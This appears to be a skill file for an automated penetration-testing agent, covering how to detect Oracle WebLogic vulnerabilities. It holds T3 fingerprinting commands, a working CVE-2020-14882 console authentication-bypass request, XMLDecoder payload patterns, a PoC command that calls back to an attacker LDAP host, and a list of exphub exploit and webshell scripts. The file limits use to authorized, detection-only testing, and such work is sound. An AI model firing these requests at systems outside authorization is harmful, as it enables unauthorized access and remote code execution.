---
name: framework-weblogic
description: WebLogic 专项：7001/T3 握手指纹、判定路径清单（console/wls-wsat/_async/uddiexplorer）、XMLDecoder 系（CVE-2017-3506/10271）、CVE-2020-14882 console 未授权 RCE、CVE-2023-21839 JNDI、IIOP 面、exphub 工具化验证
whenToUse: 7001 端口开放、T3/IIOP 协议指纹、/console 登录页识别出 WebLogic 时
role: vuln-scan
enabled: true
---

# WebLogic 中间件专项

## 指纹：7001 / T3 / IIOP

```bash
# T3 握手：响应 HELO 行带完整版本（无损判定首选）
printf 't3 12.2.1\nAS:2048\nHL:19\nMS:10000000\n\n' | timeout 5 nc $TARGET 7001
# 期望回包形如：HELO:12.2.1.0.0:false:0:0:0:1:...

# nmap 服务识别 + IIOP
nmap -sV -p 7001,7002,5556 --script weblogic-t3-info $TARGET
# console 指纹
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "http://$TARGET:7001/console/"
curl -s "http://$TARGET:7001/console/login/LoginForm.jsp" | grep -io "weblogic\|Oracle"
```

## 判定路径清单（按优先级探测）

| 路径 | 对应面 |
|---|---|
| `/console/login/LoginForm.jsp` | console 存在，可打 14882 |
| `/wls-wsat/CoordinatorPortType` | XMLDecoder 系（3506/10271） |
| `/_async/AsyncResponseService` | _async XMLDecoder 变体（10271 常用面） |
| `/uddiexplorer/SearchPublicRegistries.jsp` | SSRF（CVE-2014-4210） |
| `/iiop`（5556 端口） | IIOP 反序列化面（CVE-2020-2551） |

## XMLDecoder 系（CVE-2017-3506 / CVE-2017-10271）

- **3506**：`<java><object class="java.lang.ProcessBuilder">` 直接对象；**10271**：3506 补丁的 `void class` 绕过，同路径换成 `<void class=...>`，可走 `/wls-wsat/*` 与 `/_async/*` 双端口面。
- 影响版本：10.3.6.0 / 12.1.3.0 / 12.2.1.0-12.2.1.3。
- 无害判定：发只读 `<void method="getName">` 型 XML 或工具 poc 模式，看返回 200/错误差异。

## CVE-2020-14882 console 未授权（+14883）

```bash
# 认证绕过：双重 URL 编码路径遍历进 console.portal
curl -s -o /dev/null -w "%{http_code}\n" \
  "http://$TARGET:7001/console/images/%252E%252E%252E%252E/console.portal?_nfpb=true&_pageLabel=HomePage1"
# 200 = 未授权进后台（14882 定性完成）
```

14882 单独即可通过 `handle` 参数加载 Spring/gadget 实现 RCE；14883 是后台任意文件上传（需 14882 打通后走上传位）。判定纪律：**只以 200/302 差分定性 14882**，RCE 验证留给授权 exp 阶段，报告阶段 200 即 Critical。

## CVE-2023-21839（T3/IIOP JNDI lookup）

- T3/IIOP 注册表 lookup 任意 JNDI 名 → 让目标连攻击端。
- 默认出不了远程 codebase（新版 JDK），需配合本地 gadget（JdbcRowSetImpl 类）或仅做连通性证明；纯内网目标常打不出网，定性为 SSRF-to-self。

## IIOP 面

CVE-2020-2551（IIOP 反序列化，corba 导出对象）：

```bash
# exphub 检测脚本（只判定不利用）
python3 cve-2020-2551_poc.py $TARGET 7001 "ldap://$VPS:1389/probe"
```

## exphub 工具化验证（zhzyker/exphub weblogic/ 子目录）

| 脚本 | 用途 | 判据 |
|---|---|---|
| `cve-2017-3506_poc.py <url:port>` | wls-wsat 检测 | `[+] Vulnerability` / `[-] No` |
| `cve-2017-10271_poc.jar` | XMLDecoder 反序列化 | 同上，jar 内含检测模式 |
| `cve-2018-2628_poc.py` | WLS Core 反序列化 | 回显版本 |
| `cve-2018-2894_poc_exp.py` | 任意文件上传 | 上传探测文件 |
| `cve-2014-4210_ssrf_scan.py <ip:7001> <cidr> <n>` | SSRF 内网测绘 | 存活端口列表 |

## 纪律

- 仅授权范围内测试；poc 脚本只用检测模式，`_webshell` 后缀脚本（传马）在授权项目里也先与客户确认落盘位置。
- 14882 确认后用"能访问 console.portal 任意页面"作证据即可，RCE gadget 复现按需最小化。
- 证据脱敏：T3 HELO 版本行原样可留，console 截图遮蔽域名/内部 IP；不破坏目标——不跑 2018-2894 类写入后不清理的操作，文件上传必须附清理方式。

## 产出约定

- 记录：T3 版本行、命中路径、CVE、判定证据（200/回显/回连）。
- 回填 `redteam_poc_add`：category=weblogic（weblogic-rce / weblogic-unauth 分列），language=python/java，usage 写明脚本名与参数顺序。

<!-- 改编自: zhzyker/exphub, 2026-10-31 -->
